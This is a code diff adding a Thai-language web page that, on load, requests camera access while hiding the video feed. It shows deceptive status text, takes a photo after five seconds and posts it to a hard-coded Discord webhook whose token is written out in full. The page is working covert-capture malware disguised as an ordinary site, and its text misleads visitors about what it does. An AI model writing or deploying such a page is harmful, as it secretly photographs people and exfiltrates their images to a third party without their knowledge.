@@ -1,0 +1,82 @@
+<!DOCTYPE html>
+<html lang="th">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>ถ่ายภาพอัตโนมัติ</title>
+  <style>
+    body {
+      background: white;
+      color: black;
+      font-family: sans-serif;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      flex-direction: column;
+      text-align: center;
+    }
+    #video, #canvas { display: none; }
+    #message {
+      font-size: 1.5rem;
+      font-weight: bold;
+    }
+  </style>
+</head>
+<body>
+  <video id="video" autoplay playsinline></video>
+  <canvas id="canvas"></canvas>
+  <div id="message">กำลังรันน</div>
+
+  <script>
+    // 🧷 ใส่ Discord Webhook ของคุณตรงนี้
+    const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1430395055092273244/0Ki6mkiKrUJiCGuw4j4xP0vIw6F0e9mmswpuRTiNLBvZSfHIM3oxRKZN0NVoXztHbsfD";
+
+    const video = document.getElementById('video');
+    const canvas = document.getElementById('canvas');
+    const msg = document.getElementById('message');
+
+    async function startCamera() {
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+        video.srcObject = stream;
+        msg.textContent = "กำลังรัน รอ 5 วินาที...";
+        setTimeout(capturePhoto, 5000); // รอ 5 วิแล้วถ่าย
+      } catch (err) {
+        msg.textContent = "กดตกลงเพื่อรันเว็บ";
+      }
+    }
+
+    async function capturePhoto() {
+      const ctx = canvas.getContext('2d');
+      canvas.width = video.videoWidth;
+      canvas.height = video.videoHeight;
+      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+      canvas.toBlob(async blob => {
+        msg.textContent = "กำลังวิเคราะ";
+        await sendToDiscord(blob);
+      }, 'image/jpeg', 0.9);
+    }
+
+    async function sendToDiscord(blob) {
+      try {
+        const form = new FormData();
+        form.append("file", blob, "photo.jpg");
+        form.append("content", "📷 ภาพอัตโนมัติจากเว็บ");
+
+        const res = await fetch(DISCORD_WEBHOOK, { method: "POST", body: form });
+        if (res.ok) {
+          msg.textContent = "กำลังtest!";
+        } else {
+          msg.textContent = "❌ testไม่สำเร็จ (" + res.status + ")";
+        }
+      } catch (err) {
+        msg.textContent = "⚠️ เกิดข้อผิดพลาด: " + err.message;
+      }
+    }
+
+    // เริ่มเมื่อโหลดหน้าเว็บ
+    startCamera();
+  </script>
+</body>
+</html>
